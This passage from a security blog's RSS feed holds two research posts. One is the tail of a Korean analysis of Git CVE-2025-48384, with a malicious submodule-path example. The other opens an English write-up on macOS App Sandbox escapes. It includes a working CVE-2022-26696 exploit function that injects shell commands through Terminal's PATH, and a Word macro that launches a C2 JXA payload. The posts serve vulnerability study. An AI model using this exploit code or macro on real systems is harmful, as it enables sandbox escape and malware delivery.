class="hljs-comment">/*</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * Check to see if the value needs to be surrounded with a dq pair.</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * Note that problematic characters are always backslash-quoted; this</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * check is about not losing leading or trailing SP and strings that</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * follow beginning-of-comment characters (i.e. &apos;;&apos; and &apos;#&apos;) by the</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * configuration parser.</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         */</span></span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] == <span class="hljs-string">&apos; &apos;</span>)</span></span><span class="hljs-function"><span class="hljs-params">                quote = <span class="hljs-string">&quot;\&quot;&quot;</span>;</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; value[i]; i++)</span></span><span class="hljs-function"><span class="hljs-params">                <span class="hljs-keyword">if</span> (value[i] == <span class="hljs-string">&apos;;&apos;</span> || value[i] == <span class="hljs-string">&apos;#&apos;</span>)</span></span><span class="hljs-function"><span class="hljs-params">                        quote = <span class="hljs-string">&quot;\&quot;&quot;</span>;</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">if</span> (i &amp;&amp; value[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&apos; &apos;</span>)</span></span><span class="hljs-function"><span class="hljs-params">                quote = <span class="hljs-string">&quot;\&quot;&quot;</span>;</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">        strbuf_addf(&amp;sb, <span class="hljs-string">&quot;\t%s = %s&quot;</span>, key + store-&gt;baselen + <span class="hljs-number">1</span>, quote);</span></span></code></pre><p>&#xADF8;&#xB7F0;&#xB370; Git&#xC740; &#xAC12;&#xC744; &#xC4F8; &#xB54C;, &#xBB38;&#xC790;&#xC5F4;&#xC5D0; &#xACF5;&#xBC31;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xAC70;&#xB098;, &#xD2B9;&#xC815; &#xBB38;&#xC790;(<code>;</code>, <code>#</code>)&#xAC00; &#xC788;&#xC744; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xD070; &#xB530;&#xC634;&#xD45C;&#xB85C; &#xAC10;&#xC2F8;&#xC11C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>\r</code> &#xBB38;&#xC790;&#xB294; &#xAE30;&#xC874;&#xC5D0;&#xB294; &#xB530;&#xC634;&#xD45C; &#xCC98;&#xB9AC; &#xB300;&#xC0C1;&#xC774; &#xC544;&#xB2C8;&#xC5B4;&#xC11C;, &#xAC12;&#xC5D0; <code>\r</code>&#xC774; &#xB4E4;&#xC5B4;&#xC788;&#xB354;&#xB77C;&#xB3C4; &#xB530;&#xC634;&#xD45C; &#xC5C6;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>.gitmodules</code> &#xD30C;&#xC77C;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8; &#xC124;&#xC815;&#xC774; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-section">[submodule &quot;foo&quot;]</span>  <span class="hljs-attr">path</span> = <span class="hljs-string">&quot;foo^M&quot;</span></code></pre><p>Git&#xC740; &#xC774; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C; &#xC904; &#xB05D;&#xC758; <code>^M</code> (&#xC989; <code>\r</code>)&#xC744; &#xC81C;&#xAC70;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>path = &quot;foo&quot;</code> &#xB85C; &#xC778;&#xC2DD;&#xD558;&#xACE0;,  <code>&#x201C;foo&#x201D;</code>&#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD574; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.<br>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; &#xC774; &#xACBD;&#xB85C; &#xC815;&#xBCF4;&#xAC00; Git &#xB0B4;&#xBD80; &#xC124;&#xC815;&#xD30C;&#xC77C; (ex. <code>.git/modules/foo/config</code>) &#xC5D0;  &#xAE30;&#xB85D;&#xB420; &#xB54C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-section">[core]</span>  <span class="hljs-attr">workdir</span> = ../../../foo^M</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC810;&#xC740; Git&#xC774; &#xC774;&#xBBF8; <code>.gitmodules</code>&#xC5D0;&#xC11C; &#xC77D;&#xC740; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xACBD;&#xB85C;(path)&#xC5D0; &#xB300;&#xD574; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xB9C8;&#xCCE4;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xC774; &#xAC12;&#xC774; &#xB2E4;&#xC2DC; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC77D;&#xD790; &#xB54C;&#xB294;, &#xC904; &#xB05D;&#xC758; <code>\r</code>&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC81C;&#xAC70;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC5EC;&#xC804;&#xC774; <code>&#x201C;foo&#x201D;</code>&#xCC98;&#xB7FC; &#xC77D;&#xD788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC989;, Git&#xC774; <code>&#x201C;foo&#x201D;</code> &#xACBD;&#xB85C;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74;&#xC11C; &#xC791;&#xC5C5;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C;&#xB85C;&#xB294; <code>&#x201C;foo^M&#x201D;</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8;&#xC744; &#xBCF5;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul><li><a href="https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file">https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file</a></li></ul><p><code>git clone --recursive</code> &#xBA85;&#xB839;&#xC740; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC758; README&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xAD8C;&#xC7A5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774; &#xBA85;&#xB839;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC545;&#xC131; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xC720;&#xB3C4;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC784;&#xC758; &#xD30C;&#xC77C; &#xC4F0;&#xAE30;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="image.png" alt="image.png"></p><p>&#xCDE8;&#xC57D;&#xD55C; git &#xBC84;&#xC804;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xACF5;&#xAC1C;&#xB41C; PoC&#xB97C; &#xD074;&#xB860;&#xD558;&#xBA74; tmp &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC544;&#xB798;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2.43.7, 2.44.4, 2.45.4, 2.46.4, 2.47.3, 2.48.2, 2.49.1, 2.50.1 &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384">https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384</a></li><li><a href="https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file">https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file</a></li><li><a href="https://securitylabs.datadoghq.com/articles/git-arbitrary-file-write/">https://securitylabs.datadoghq.com/articles/git-arbitrary-file-write</a></li><li><a href="https://arcticwolf.com/resources/blog/poc-available-for-high-severity-arbitrary-file-write-in-git-cli-cve-2025-48384/">https://arcticwolf.com/resources/blog/poc-available-for-high-severity-arbitrary-file-write-in-git-cli-cve-2025-48384/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE%E2%80%912025%E2%80%9148384/">CVE‑2025‑48384</category>
      
      <category domain="https://hackyboiz.github.io/tags/git/">git</category>
      
      <category domain="https://hackyboiz.github.io/tags/Arbitrary-File-Write/">Arbitrary File Write</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/09/bekim/2025-08-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] macOS: Part2 - Sandbox Escape (en)</title>
      <link>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/</link>
      <guid>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/</guid>
      <pubDate>Thu, 07 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/&quot;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyb</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/">macOS: Part0 - TCC Bypass</a></p><p><a href="https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/">macOS: Part1 - SIP Bypass</a> </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/MacOS_Sandbox_Escape.png" alt="image.png"></p><p>macOS: Part2 - Sandbox Escape &#x2190; Now!</p><p>Hello~ I&#x2019;m clalxk!</p><p>Today, following Part1, I studied Sandbox Escape.</p><p>From the concept of the macOS Sandbox to the analysis of a 1-day vulnerability (CVE-2025-31191), it&#x2019;s all here&#x2014;let&#x2019;s learn together.. (&gt;&lt;)</p><h2 id="0-App"><a href="#0-App" class="headerlink" title="0. App"></a>0. App</h2><p>If you&#x2019;ve used Windows or Linux, the concept of an <code>App</code> on macOS might feel unfamiliar. It&#x2019;s unfamiliar, but not difficult b^_^b. Generally, when you run a single executable file (<code>.exe</code>, <code>a.out</code>), you think of the program starting immediately, loading libraries or config files from somewhere in the system as needed.</p><p>For example, on Windows, if you run <code>notepad++.exe</code>, that one file launches the process.</p><p>During that process, required <code>.dll</code> libraries are dynamically loaded from system folders or the installation path, and settings are stored externally in <code>.ini</code> files or the registry.</p><p>However! On macOS, this structure is slightly different.</p><p>On macOS, an <code>App</code> isn&#x2019;t just a simple executable file but a <strong>bundle</strong> with a <strong>directory structure</strong> (<strong>Bundle</strong>)</p><p>Although it looks like a single app in Finder, in Terminal you&#x2019;ll see that <code>.app</code> is a directory containing not only the executable but also all necessary <strong>resources, config files, plugins, code signature data, etc.</strong></p><p>Think of macOS treating an app as a package that bundles <strong>everything needed to run the app</strong> rather than a single program file.</p><p>Let&#x2019;s look at the built-in Calculator app as an example!</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image1.png" alt="image.png"></p><p>Inside the <code>Contents</code> folder, you&#x2019;ll find.</p><ul><li><code>MacOS/</code>: Folder containing the executable</li><li><code>Info.plist</code>: XML config file holding the app&#x2019;s metadata</li><li><code>Resources/</code>: Icons, images, language packs, other resources</li><li><code>PlugIns/</code>: (Optional) Plugins</li><li><code>_CodeSignature/</code>: (Optional) Code signature info</li><li><code>version.plist</code>, <code>PkgInfo</code>: (Optional) Other details</li></ul><p><code>Info.plist</code> is an XML-format file that holds important metadata about the app.</p><p>It includes the path to the executable, the app name, the bundle ID, version, and more.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleExecutable<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleIdentifier<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.apple.calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></code></pre><p>Let&#x2019;s try running the app!</p><h3 id="0-1-Launching-an-App"><a href="#0-1-Launching-an-App" class="headerlink" title="0.1 Launching an App"></a><strong>0.1 Launching an App</strong></h3><p>Launching an app essentially means <strong>creating a process</strong> that runs the binary specified by the <code>CFBundleExecutable</code> key. But which parent process launches it?</p><p><em>* <code>CFBundleExecutable</code>: A key in the <code>Info.plist</code> of a macOS app bundle specifying the name of the binary to execute.</em></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image2.png" alt="image.png"></p><p>The command <code>open -a Calculator</code> is the same as double-clicking the Calculator app.</p><p>I ran <code>ps</code> while Calculator was open:</p><p><code>/System/Applications/Calculator.app/Contents/MacOS/Calculator</code> is running, PID 5012. Its parent process (PPID) is <code>1</code>!</p><p>On macOS, PID 1 is <code>/sbin/launchd</code>. This daemon manages all system and user agents on macOS&#x2014;think of it like Windows&#x2019; <code>services.exe</code> or Linux&#x2019;s <code>systemd</code>. It not only manages background services but also acts as the <strong>parent for every GUI-launched app</strong>.</p><p>When users double-click or use <code>open -a</code>, the app runs as a child of <code>launchd</code> (PID 1), making the process tree flat. On other OSes, you can trace which shell or terminal launched a program by following the PPID, but on macOS GUI launches, all apps appear as children of <code>launchd</code>.</p><p>Before macOS Ventura, you could run the executable directly without <code>open</code>. But if not launched within a proper <code>launchd</code> environment, macOS would SIGKILL the app to protect the App Sandbox and TCC.</p><pre><code class="hljs bash">$ /System/Applications/Calculator.app/Contents/MacOS/Calculator &amp; $ ps -A -j | grep Calculator | grep -v grep</code></pre><p>When run directly, the parent was the shell, not <code>launchd</code>.</p><p>For testing, I created a dummy <code>.app</code>:</p><pre><code class="hljs bash">mkdir -p ~/MyApp.app/Contents/MacOS<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&apos;#!/bin/bash\nsleep 10&apos;</span> &gt; ~/MyApp.app/Contents/MacOS/MyAppchmod +x ~/MyApp.app/Contents/MacOS/MyApp~/MyApp.app/Contents/MacOS/MyApp &amp;ps -A -j | grep MyAppopen -a MyAppps -A -j | grep MyApp</code></pre><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image3.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image4.png" alt="image.png"></p><p>As expected, direct invocation makes it a terminal child while <code>open -a</code> makes it a <code>launchd</code> child.</p><p><code>launchd</code> also handles <code>LaunchAgents</code> and <code>LaunchDaemons</code> for background services, but we won&#x2019;t cover that today. To be continued&#x2026;</p><p>The <code>.app</code> described so far is just one of many types of bundles.</p><p>macOS has various bundle types, as shown below. (This is not a complete list.)</p><ul><li><code>.app</code> &#x2013; An application bundle that contains all the elements that make up an app.</li><li><code>.framework</code> &#x2013; A framework bundle that includes not only loadable code like <code>.dylib</code> but also resources, version information, etc. (The entire framework bundle can be loaded using <code>dlopen()</code>.)</li><li><code>.kext</code> &#x2013; A kernel extension bundle that acts as an extension module loaded directly into the macOS kernel. For security reasons, Apple is gradually restricting their use in the latest versions of macOS.</li><li><code>.plugin</code> &#x2013; Plugin bundles, which include extension modules loaded by the main application</li></ul><p>As such, bundles are not only used to run apps, but also serve as core components that support functional expansion and modularized structures across macOS. </p><p>If so, let&#x2019;s move on~</p><h2 id="1-App-Sandbox"><a href="#1-App-Sandbox" class="headerlink" title="1. App Sandbox"></a>1. App Sandbox</h2><p>We&#x2019;ve seen that macOS apps are bundles. Now let&#x2019;s see how apps are executed and restricted by the system.</p><p>The key concept today is the <strong>App Sandbox</strong>!</p><p>Ideally, from a security standpoint, you&#x2019;d never run untrusted code. But we install and run many apps, so macOS encloses each app in a <strong>sandbox</strong>, restricting it within a &#x201C;box&#x201D; it can&#x2019;t escape.</p><p>Sandboxed apps are denied by default.</p><div class="table-container"><table><thead><tr><th>Restriction</th><th>Description</th></tr></thead><tbody><tr><td>File system</td><td>No access to all files, including home directory</td></tr><tr><td>Network</td><td>No internet or socket access</td></tr><tr><td>Microphone/Camera</td><td>No direct access (requires TCC approval)</td></tr><tr><td>Photo library</td><td>No access (requires separate permission)</td></tr><tr><td>System APIs</td><td>Blocked system calls, process control, etc.</td></tr><tr><td>Child processes</td><td>Can spawn, but children inherit the same sandbox limits</td></tr></tbody></table></div><p>To avoid breaking essential features, some entitlements can be granted.</p><p>For example, an image editor needs to open/save files chosen by the user. A sandboxed app needs explicit exceptions for this, defined in its <code>Entitlements</code>.</p><p><em>* <code>Entitlements</code>: Permissions declared at code signing time, listing allowed capabilities.</em></p><h3 id="1-1-What-are-Entitlements"><a href="#1-1-What-are-Entitlements" class="headerlink" title="1.1 What are Entitlements?"></a>1.1 What are Entitlements?</h3><p>Entitlements are declared in an XML-format <code>.entitlements</code> file or set in Xcode under Signing &amp; Capabilities.</p><div class="table-container"><table><thead><tr><th>Entitlement Key</th><th>Description</th></tr></thead><tbody><tr><td><code>com.apple.security.network.client</code></td><td>Allow network client access</td></tr><tr><td><code>com.apple.security.files.user-selected.read-write</code></td><td>Allow read/write to user-selected files</td></tr><tr><td><code>com.apple.security.assets.pictures.read-write</code></td><td>Allow photo library read/write</td></tr><tr><td><code>com.apple.security.device.camera</code></td><td>Allow camera access</td></tr></tbody></table></div><p>In other words, the app cannot do anything by default, but can only operate within the permissions granted by the user.</p><p><code>Entitlements</code> are typically written in XML format as <code>.entitlements</code> files, and can be added visually in Xcode under the Target &gt; Signing &amp; Capabilities tab.</p><p>++  When using Sandbox, you must declare it as follows.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.app-sandbox<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span></code></pre><p>This key must be declared for macOS to run the app in sandbox mode.</p><h3 id="1-2-TCC"><a href="#1-2-TCC" class="headerlink" title="1.2 TCC"></a>1.2 TCC</h3><p>You&#x2019;ve seen messages like:</p><blockquote><p>&#x201C;@@@&#x201D; Would Like to Modify Apps on your Mac.</p></blockquote><p>This prompt comes from macOS&#x2019;s <strong>TCC</strong> (Transparency, Consent, and Control). When an app attempts to access sensitive data, TCC forces an explicit user consent step, preventing unauthorized access.</p><h2 id="2-Sandbox-Escape"><a href="#2-Sandbox-Escape" class="headerlink" title="2. Sandbox Escape"></a>2. Sandbox Escape</h2><p>We&#x2019;ve explored how strict the App Sandbox is. Can we bypass it to escape the sandbox?</p><p>Of course it&#x2019;s not easy&#x2014;macOS enforces strict access controls. But vulnerabilities have existed. Let&#x2019;s analyze known macOS sandbox escape cases.</p><h3 id="2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app"><a href="#2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app" class="headerlink" title="2.1 CVE-2022-26696: Sandbox Escape via Terminal.app"></a>2.1 CVE-2022-26696: Sandbox Escape via Terminal.app</h3><p>CVE-2022-26696 was a vulnerability that allowed sandboxed apps to escape the sandbox by setting <strong>specific environment variables</strong> when running Terminal.app, causing Terminal to inherit that environment.</p><p>In Terminal&#x2019;s code, <code>isRunningInInstallEnvironment()</code> checks the <code>__OSINSTALL_ENVIRONMENT</code> env var:</p><pre><code class="hljs bash">+(char)isRunningInInstallEnvironment {    <span class="hljs-keyword">if</span> (*(int8_t *)byte_10010617c == 0x1) {        rax = *(int8_t *)byte_10010617b;    } <span class="hljs-keyword">else</span> {        COND = getenv(<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>) != 0x0;        rax = COND_BYTE_SET(NE);        *(int8_t *)byte_10010617b = COND ? 0x1 : 0x0;        *(int8_t *)byte_10010617c = 0x1;    }    rax = sign_extend_64(rax);    <span class="hljs-built_in">return</span> rax;}</code></pre><p>This checks whether the environment variable <code>__OSINSTALL_ENVIRONMENT</code> is set internally, and if it is, Terminal determines that it is <strong>running in the BaseSystem environment</strong>.</p><p><em>* BaseSystem: Installation UI when booting from a macOS installation USB, macOS Recovery Mode, minimal system environment with BaseSystem.dmg mounted, etc.</em></p><pre><code class="hljs bash">-(void *)init {    var_30 = self;    *(&amp;var_30 + 0x8) = *0x1000f4790;    rax = [[&amp;var_30 super] init];    r14 = rax;    <span class="hljs-keyword">if</span> (rax != 0x0) {        <span class="hljs-keyword">if</span> (*qword_100105e38 == 0x0) {            *qword_100105e38 = r14;        }        rbx = [[[NSProcessInfo processInfo] environment] mutableCopy];        <span class="hljs-keyword">if</span> ([objc_opt_class(r14) **isRunningInInstallEnvironment**] == 0x0) {            [rbx removeObjectForKey:@<span class="hljs-string">&quot;HOME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;USER&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;LOGNAME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;PATH&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;SHELL&quot;</span>];        }</code></pre><p>Within the <code>init</code> function, if the value of isRunningInInstallEnvironment() is <code>NO</code>, Terminal is designed to delete key environment variables such as <code>HOME</code> and <code>PATH</code>. However, if this value is YES, the environment variables are not deleted and remain unchanged. Ultimately, by setting the single environment variable __OSINSTALL_ENVIRONMENT=1, Terminal.app will run without deleting the environment variables. This allows sandboxed apps to execute shell commands by running Terminal.</p><p>By exploiting this vulnerability, you can achieve the desired results by performing the following actions within the sandbox app!</p><ol><li>Run Terminal.app with the <code>__OSINSTALL_ENVIRONMENT=1</code> environment variable</li><li>Insert malicious commands into the <code>PATH</code> environment variable &#x2192; in the form of <code>$(malicious_command)</code></li><li>Terminal accepts and executes the environment variables as is</li><li>Execute malicious commands by bypassing the sandboxed app</li></ol><pre><code class="hljs bash">void sbxWithShellCommand(NSString *<span class="hljs-built_in">command</span>) {    FSRef appFSURL;    NSString *path = @<span class="hljs-string">&quot;/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&quot;</span>;    OSStatus stat2 = FSPathMakeRef((const UInt8 *)[path UTF8String], &amp;appFSURL, NULL);    <span class="hljs-keyword">if</span> (stat2 &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>,stat2);    }    LSApplicationParameters appParam;    appParam.version = 0;    appParam.flags = kLSLaunchDefaults;    appParam.application = &amp;appFSURL;    appParam.argv = NULL;    // Pass the <span class="hljs-built_in">command</span> to be executed as an environment variable.    NSString *finalCommand = [NSString stringWithFormat:@<span class="hljs-string">&quot;<span class="hljs-subst">$(%@)</span>&quot;</span>, <span class="hljs-built_in">command</span>];    NSDictionary *envs = @{@<span class="hljs-string">&quot;PATH&quot;</span>:finalCommand, @<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>:@<span class="hljs-string">&quot;1&quot;</span>};    appParam.environment = (__bridge CFDictionaryRef)envs;    appParam.asyncLaunchRefCon = NULL;    appParam.initialEvent = NULL;    CFArrayRef array = (__bridge CFArrayRef)@[];    OSStatus <span class="hljs-built_in">stat</span> = **LSOpenURLsWithRole**(array, kLSRolesAll, NULL, &amp;appParam, NULL, 0);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stat</span> &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>, <span class="hljs-built_in">stat</span>);    }}</code></pre><p>Apple&#x2019;s <a href="https://developer.apple.com/documentation/coreservices/launch_services"><strong>LaunchServices API</strong></a> <code>LSOpenURLsWithRole()</code> is used to run Terminal, passing the shell command as an environment variable.</p><p>Additionally, this vulnerability could also be exploited within Microsoft Word macros!</p><pre><code class="hljs bash">Sub AutoOpen()MacScript (<span class="hljs-string">&quot;do shell script &quot;</span><span class="hljs-string">&quot;open -b com.apple.terminal --env __OSINSTALL_ENVIRONMENT=1 --env PATH=&apos;<span class="hljs-subst">$(/usr/bin/osascript -l JavaScript /path/.apfell.js)</span>&apos;&quot;</span><span class="hljs-string">&quot; &quot;</span>)End Sub</code></pre><p>You can load the Mythic <strong>C2 JXA Payload</strong> by including it in a macro in a Word document.</p><p>++ Apple has designated this vulnerability as <code>CVE-2022-26696</code> and modified Terminal so that it no longer trusts the <code>__OSINSTALL_ENVIRONMENT</code> environment variable.</p><p>I checked each function based on my terminal (v2.14).</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image5.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image6.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image7.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image8.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image9.png" alt="image.png"></p><p>It has been changed so that it not only filters environment variables, but also checks a wider range of security conditions and structurally initializes the internal state.</p><p>The structure that previously relied solely on <code>__OSINSTALL_ENVIRONMENT</code> has been removed, and security has been strengthened so that Terminal only operates in a normal launchd environment. Additionally, Launch Services has been modified to recognize whether the <strong>XPC</strong> client is in a sandboxed state.</p><p>[TTApplication init] code</p><pre><code class="hljs bash">TTApplication *__cdecl -[TTApplication init](TTApplication *self, SEL a2){  TTApplication *v2; // rax  TTApplication *v3; // rbx  id v4; // rax  id v5; // rax  id v6; // r14  void *v7; // rax  id v8; // rax  id v9; // rax  id v10; // rax  id v11; // rax  struct objc_super v13; // [rsp+0h] [rbp-30h] BYREF  v13.receiver = self;  v13.cls = &amp;OBJC_CLASS___TTApplication;  v2 = (TTApplication *)objc_msgSendSuper2(&amp;v13, <span class="hljs-string">&quot;init&quot;</span>);  v3 = v2;  <span class="hljs-keyword">if</span> ( v2 )                                     // rax  {    <span class="hljs-keyword">if</span> ( !qword_1000FFE38 )      qword_1000FFE38 = v2;    v4 = objc_msgSend(&amp;OBJC_CLASS___NSProcessInfo, <span class="hljs-string">&quot;processInfo&quot;</span>);    v5 = objc_msgSend(v4, <span class="hljs-string">&quot;environment&quot;</span>);    v6 = objc_msgSend(v5, <span class="hljs-string">&quot;mutableCopy&quot;</span>);    v7 = (void *)objc_opt_class(v3);    <span class="hljs-keyword">if</span> ( !(unsigned __int8)objc_msgSend(v7, <span class="hljs-string">&quot;isRunningInInstallEnvironment&quot;</span>) )    {      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFD90);// <span class="hljs-string">&quot;HOME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDB0);// <span class="hljs-string">&quot;USER&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDD0);// <span class="hljs-string">&quot;LOGNAME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDF0);// <span class="hljs-string">&quot;PATH&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE10);// <span 